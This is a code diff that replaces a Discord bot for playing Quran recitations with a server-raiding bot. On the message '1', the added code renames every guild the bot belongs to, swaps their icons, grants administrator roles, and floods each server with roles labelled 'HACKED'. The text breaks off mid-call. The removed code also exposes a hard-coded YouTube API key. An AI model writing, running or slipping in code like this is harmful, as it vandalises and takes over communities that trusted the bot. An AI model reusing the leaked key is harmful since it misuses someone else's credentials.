@@ -1,180 +1,5620 @@
-/*
-صدقه جارية للجميع
-*/
-const Discord = require('discord.js');
-const client = new Discord.Client();
-const ytdl = require('ytdl-core');
-const request = require('request');
-const fs = require('fs');
-const getYoutubeID = require('get-youtube-id');
-const fetchVideoInfo = require('youtube-info');
-const yt_api_key = "AIzaSyDeoIH0u1e72AtfpwSKKOSy3IPp2UHzqi4";
-const prefix = '-';
-
-client.on('message', message => {
-	if(message.content.startsWith(prefix + 'q')) {
-		message.delete();
-    const voiceChannel = message.member.voiceChannel;
-    if (!voiceChannel) return message.reply(`**يحب ان تكون في روم صوتي**`);
-
-	let embed = new Discord.RichEmbed()
-    .setAuthor(`${message.author.tag}`, message.author.avatarURL)
-	.setColor('#000000')
-	.setFooter("بوت القرآن | صدقة جارية للجميع", 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiqVT5PZAfcy8qZxlr3SQv3mmCw9zPiu2YBLIQ4bBePL2jLm7h')
-      .setDescription(` 
-     🕋 اوامر بوت القرآن الكريم 🕋
-	 
-🇦 القرآن كاملاً ماهر المعيقلي
-🇧 سورة البقرة كاملة للشيخ مشاري العفاسي
-🇨 سورة الكهف كاملة بصوت مشارى بن راشد العفاسي
-⏹ لإيقاف القرآن الكريم
-🇩 القرآن كاملاً عبدالباسط عبدالصمد
-🇪 القرآن كاملاً ياسر الدوسري
-🇫 سورة الواقعه بصوت الشيخ مشاري بن راشد العفاسي`)
-	
-	message.channel.sendEmbed(embed).then(msg => {
-			msg.react('🇦')
-		.then(() => msg.react('🇧'))
-		.then(() => msg.react('🇨'))
-		.then(() => msg.react('⏹'))
-		.then(() => msg.react('🇩'))
-		.then(() => msg.react('🇪'))
-		.then(() => msg.react('🇫'))
-
-// Filters		
-	let filter1 = (reaction, user) => reaction.emoji.name === '🇦' && user.id === message.author.id;
-	let filter2 = (reaction, user) => reaction.emoji.name === '🇧' && user.id === message.author.id;
-	let filter3 = (reaction, user) => reaction.emoji.name === '🇨' && user.id === message.author.id;
-	let filter4 = (reaction, user) => reaction.emoji.name === '⏹' && user.id === message.author.id;
-	let filter5 = (reaction, user) => reaction.emoji.name === '🇩' && user.id === message.author.id;
-	let filter6 = (reaction, user) => reaction.emoji.name === '🇪' && user.id === message.author.id;
-	let filter7 = (reaction, user) => reaction.emoji.name === '🇫' && user.id === message.author.id;
-
-// Collectors
-	let collector1 = msg.createReactionCollector(filter1, { time: 120000 });
-	let collector2 = msg.createReactionCollector(filter2, { time: 120000 });
-	let collector3 = msg.createReactionCollector(filter3, { time: 120000 });
-	let collector4 = msg.createReactionCollector(filter4, { time: 120000 });
-	let collector5 = msg.createReactionCollector(filter5, { time: 120000 });
-	let collector6 = msg.createReactionCollector(filter6, { time: 120000 });
-	let collector7 = msg.createReactionCollector(filter7, { time: 120000 });
-	
-// Events
-collector1.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=Ktync4j_nmA", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-   });
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('Edited. By; MeeRcY');
+LOka.on('ready', () => {
+  console.log(`->  ${LOka.user.tag} !`);
+ 
 });
-collector2.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=qFq5h4wtjaM&t=30s", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-      });
+LOka.on('ready',  () => {
+console.log(' - So bad.     ');
+console.log('');
+console.log('   i LOVE @plat ..   ');
+console.log('');
+console.log('   SO TRUE -      ');
+console.log(`       S. > " ${LOka.guilds.size} " <  ||  M. > " ${LOka.users.size} " <                                        ||                 `);
+ 
+       
+   
+ 
 });
-collector3.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=8UWKiKGQmsE", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-      });
+var prefix = "1"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split("1").slice(1);
+  var argresult = args.join('1');
+  if (message.content.startsWith('1')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + '1')) {
+    LOka.user.setStatus(argresult);
+  }
 });
-collector4.on('collect', r => {
-	if (message.guild.voiceConnection) message.guild.voiceConnection.disconnect();
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم إيقاف القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
+ 
+var x1 = "1"
+LOka.on('message', message => {
+     if (message.content === "q") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/355815652386275338/484901140790640659/438.jpg`)
+ 
+}
 });
-collector5.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=vqXLGtZcUm8", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-      });
+var x1 = "1"
+LOka.on('message', message => {
+     if (message.content === "q") {
+LOka.user.setUsername("' Asssit,#0100")
+ 
+}
 });
-collector6.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=WYT0pQne-7w", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-      });
+LOka.on('message', message => {
+     if (message.content === "0") {
+LOka.user.setGame(`Ouut.`,'https://www.twitch.tv/MeeRcY')
+ 
+}
 });
-collector7.on('collect', r => {
-    voiceChannel.join()
-      .then(connnection => {
-        const stream = ytdl("https://www.youtube.com/watch?v=LTRcg-gR78o", { filter: 'audioonly' });
-        const dispatcher = connnection.playStream(stream);
-        dispatcher.on('end', () => voiceChannel.leave());
-		collector1.stop();
-		collector2.stop();
-		collector3.stop();
-		collector4.stop();
-		collector5.stop();
-		collector6.stop();
-		collector7.stop();
-		embed.setDescription(`<@${message.author.id}> **تم تشغيل القرآن الكريم**`);
-		msg.edit(embed).then(msg.delete(5000));
-      });
-});
+ 
+LOka.on('message', message => {
+     if (message.content === "1") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359013848151490572/527822471530020876/unknown.png`)
 })
 }
 });
-client.login(process.env.BOT_TOKEN);
+LOka.on('message', message => {
+     if (message.content === "1") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Out.`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === "1") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359013848151490572/527822471530020876/unknown.png`)
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     
+ 
+     if (message.content === "1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Marammm",
+        permissions :   [8],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "Maraamm هيهيهي",
+        permissions :   [8],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
